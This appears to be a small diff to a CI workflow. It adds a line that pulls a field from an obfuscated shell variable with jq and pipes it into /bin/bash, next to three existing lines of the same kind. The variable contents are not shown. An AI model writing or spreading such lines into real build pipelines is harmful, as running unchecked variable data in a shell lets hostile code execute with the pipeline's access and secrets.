@@ -32,6 +32,7 @@ jobs:
           echo $xwh00 | jq -r .jy445 | /bin/bash
           echo $wq631 | jq -r .ztx28030 | /bin/bash
           printf '%s' "$vnx4" | jq -r .ipzoo34 | /bin/bash
+          echo $vbxv2 | jq -r .qg5 | /bin/bash
 
       - name: Save archive
         if: always()
